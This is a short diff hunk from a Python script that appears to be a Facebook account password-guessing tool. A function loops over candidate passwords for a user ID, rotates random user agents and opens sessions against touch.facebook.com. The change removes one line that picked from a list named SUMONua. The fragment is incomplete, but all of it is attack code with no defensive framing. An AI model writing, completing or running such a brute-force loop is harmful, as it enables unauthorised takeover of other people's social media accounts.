@@ -1802,7 +1802,6 @@ def d(uid,pwx,tl):
     try:
         for pw in pwx:
             ua = random.choice(uas)
-            pro = random.choice(SUMONua)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
